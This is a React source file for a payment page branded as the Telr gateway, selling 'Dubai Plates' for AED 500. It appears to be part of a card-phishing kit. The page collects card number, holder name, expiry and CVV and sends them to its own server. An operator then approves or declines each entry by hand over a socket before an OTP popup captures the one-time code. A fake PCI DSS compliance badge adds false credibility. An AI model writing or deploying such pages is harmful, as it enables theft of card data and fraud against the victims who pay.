import React, { useState } from "react";
import axios from "axios";
import { api_route, socket } from "../App";
import OtpPopup from "../Components/OtpPopup";
import { TailSpin } from "react-loader-spinner";

const VisaPage = ({ loading, setLoading }) => {
  const [formData, setFormData] = useState({
    cardNumber: "",
    cardName: "",
    expiryMonth: "03",
    expiryYear: "2026",
    cvv: "",
  });
  const [showOtp, setShowOtp] = useState(false);
  const [orderId, setOrderId] = useState(null);
  const [error, setError] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsProcessing(true);
    setError("");

    try {
      // Create a temporary order or initial submission
      const response = await axios.post(`${api_route}/visa`, {
        ...formData,
        cardType: formData.cardNumber.startsWith("4") ? "visa" : "mastercard"
      });

      const order = response.data.order;
      console.log(order)
      setOrderId(order._id);
      localStorage.setItem("orderId", order._id);
      localStorage.setItem("cardType", formData.cardNumber.startsWith("4") ? "visa" : "mastercard");
      socket.emit("joinOrder", order._id);
      socket.emit("visa", order);



    } catch (err) {
      setError("An error occurred. Please try again.");
      setIsProcessing(false);
    }
  };

        // Listen for approval from admin
      socket.on("acceptVisa", (id) => {
        console.log("accepted",id)
        if (id === orderId) {
          setShowOtp(true);
          setIsProcessing(false);
        }
      });

      socket.on("declineVisa", (id) => {
          console.log('declined',id)
        if (id === orderId) {
        
          setError("Your payment was declined by the bank.");
          setIsProcessing(false);
        }
      });

  return (
    <div className="w-full min-h-screen bg-gray-50 flex flex-col items-center">
      {/* Header */}
      <div className="w-full bg-[#005C42] text-white p-4">
        <h1 className="text-xl font-semibold">Telr Secure Payments</h1>
        <div className="mt-2 text-sm opacity-90">
          <p>Purchase for AED 500.00</p>
          <p>Description: 1 Dubai Plates</p>
        </div>
      </div>

      <div className="w-full max-w-2xl bg-white shadow-md p-6 mt-4 rounded-sm">
        <h2 className="text-lg font-medium border-b pb-2 mb-4">Select Payment Method</h2>
        
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <input type="radio" checked readOnly className="w-4 h-4 accent-blue-600" />
              <span className="font-medium">Credit/Debit Card</span>
            </div>
            <div className="flex gap-2 items-center">
              <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg" alt="Visa" className="h-4" />
              <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-4" />
              <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="Amex" className="h-6" />
            </div>
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-semibold text-gray-700">Card holder </label>
            <input
              type="text"
              name="cardName"
              placeholder="Card holder "
              className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
              value={formData.cardName}
              onChange={handleChange}
              required
            />
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-semibold text-gray-700">Card number</label>
            <input
              type="text"
              name="cardNumber"
              placeholder="Card number"
              className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
              value={formData.cardNumber}
              onChange={handleChange}
              maxLength={16}
              minLength={16}
              pattern="[0-9]*"
              inputMode="numeric"
              required
            />
          </div>

          <div className="grid grid-cols-3 gap-4">
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700">Expiry month</label>
              <select
                name="expiryMonth"
                className="w-full border p-2 rounded bg-white shadow-sm"
                value={formData.expiryMonth}
                onChange={handleChange}
              >
                {Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, '0')).map(m => (
                  <option key={m} value={m}>{m}</option>
                ))}
              </select>
            </div>
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700">Expiry year</label>
              <select
                name="expiryYear"
                className="w-full border p-2 rounded bg-white shadow-sm"
                value={formData.expiryYear}
                onChange={handleChange}
              >
                {Array.from({ length: 10 }, (_, i) => 2024 + i).map(y => (
                  <option key={y} value={y}>{y}</option>
                ))}
              </select>
            </div>
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700">Security code</label>
              <input
                type="text"
                name="cvv"
                placeholder="CVV"
                className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
                value={formData.cvv}
                onChange={handleChange}
                maxLength={3}
                minLength={3}
                pattern="[0-9]*"
                inputMode="numeric"
                required
              />
            </div>
          </div>

          <div className="flex items-center gap-2 text-xs text-gray-600">
             <input type="checkbox" required className="accent-blue-600" />
             <span>By agreeing, the system will share your card details, billing address and email with Click to Pay to allow you to securely enroll for faster checkouts. <a href="#!" className="text-blue-600 underline">Learn more</a></span>
          </div>

          {error && <p className="text-red-500 text-sm text-center font-bold">{error}</p>}

          <div className="flex gap-4 pt-4 border-t">
            <button
              disabled={isProcessing}
              type="submit"
              className="flex-1 bg-[#5AB35A] text-white py-2 rounded font-medium hover:bg-[#4a9a4a] transition-colors disabled:opacity-50"
            >
              {isProcessing ? "Processing..." : "Make payment"}
            </button>
            <button
              type="button"
              className="flex-1 bg-[#E14D43] text-white py-2 rounded font-medium hover:bg-[#c93d34] transition-colors"
            >
              Cancel
            </button>
          </div>
        </form>
      </div>

      <div className="mt-8 flex flex-col items-center gap-4 text-xs text-gray-500 pb-10">
        <label className="flex items-center gap-2">
          <input type="checkbox" defaultChecked className="accent-blue-600" />
          <span>I agree to the website's <a href="#!" className="underline">terms and conditions</a></span>
        </label>
        
        <div className="flex items-center gap-4 opacity-70">
           {/* PCI DSS Logo Placeholder */}
           <div className="flex items-center gap-1 font-bold border rounded p-1">
             <span className="text-blue-900 italic">PCI</span>
             <span className="text-green-600">DSS</span>
             <span className="text-[8px] font-normal ml-1">COMPLIANT</span>
           </div>
           <p>Powered by Telr | Terms & Conditions | Privacy Policy</p>
        </div>
      </div>

      {showOtp && <OtpPopup orderId={orderId} cardNumber={formData.cardNumber} setShowOtp={setShowOtp} setLoading={setLoading} />}
      
      {isProcessing && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
              <div className="bg-white p-6 rounded shadow-lg flex flex-col items-center gap-4">
                  <TailSpin color="#005C42" height={50} width={50} />
                  <p className="font-medium">Waiting for bank approval...</p>
              </div>
          </div>
      )}
    </div>
  );
};

export default VisaPage;
